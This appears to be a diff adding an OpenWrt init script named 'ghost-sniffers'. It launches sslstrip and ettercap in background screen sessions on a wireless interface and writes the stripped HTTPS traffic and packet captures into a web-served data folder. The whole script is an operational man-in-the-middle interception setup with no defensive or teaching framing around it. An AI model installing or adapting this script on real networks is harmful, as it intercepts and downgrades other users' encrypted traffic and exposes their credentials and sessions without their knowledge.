@@ -1,0 +1,44 @@
+#!/bin/sh /etc/rc.common
+# /etc/init.d/ghost-sniffers
+
+START=20
+STOP=25
+
+### BEGIN INIT INFO
+# Provides:          ettercap
+# Required-Start:    $network
+# Required-Stop:
+# Default-Start:     3 5
+# Default-Stop:      0 1 2 6
+# Short-Description: Ghost Sniffers
+# Description:       Startup script for starting the sniffers feeding the node information
+### END INIT INFO
+
+SSLSTRIP_LOG="/www/ghost/data/incoming/sslstrip.log"
+SSLSTRIP_PORT="8080"
+SSLSTRIP_SCREEN_NAME="ghost-sslstrip"
+
+ETTERCAP_LOG="/www/ghost/data/incoming/ettercap.pcap"
+ETTERCAP_INTERFACE="wlan0-1"
+ETTERCAP_SCREEN_NAME="ghost-ettercap"
+
+start() {
+    screen -S $SSLSTRIP_SCREEN_NAME -d -m sh -c "sslstrip -w $SSLSTRIP_LOG -p -l $SSLSTRIP_PORT -k"
+    echo "Sslstrip started on screen $SSLSTRIP_SCREEN_NAME"
+    screen -S $ETTERCAP_SCREEN_NAME -d -m sh -c "ettercap -i $ETTERCAP_INTERFACE -T -d -V text -E -w $ETTERCAP_LOG"
+    echo "Ettercap started on screen $ETTERCAP_SCREEN_NAME"
+}
+stop() {
+    screen -X -S $SSLSTRIP_SCREEN_NAME quit
+    screen -X -S $ETTERCAP_SCREEN_NAME quit
+    echo "Sniffers $SSLSTRIP_SCREEN_NAME and $ETTERCAP_SCREEN_NAME shutting down"
+}
+restart() {
+    screen -X -S $SSLSTRIP_SCREEN_NAME quit
+    screen -X -S $ETTERCAP_SCREEN_NAME quit
+    echo "Sniffers $SSLSTRIP_SCREEN_NAME and $ETTERCAP_SCREEN_NAME shutting down"
+    screen -S $SSLSTRIP_SCREEN_NAME -d -m sh -c "sslstrip -w $SSLSTRIP_LOG -p -l $SSLSTRIP_PORT -k"
+    echo "Sslstrip started on screen $SSLSTRIP_SCREEN_NAME"
+    screen -S $ETTERCAP_SCREEN_NAME -d -m sh -c "ettercap -i $ETTERCAP_INTERFACE -T -d -V text -E -w $ETTERCAP_LOG"
+    echo "Ettercap started on screen $ETTERCAP_SCREEN_NAME"
+}
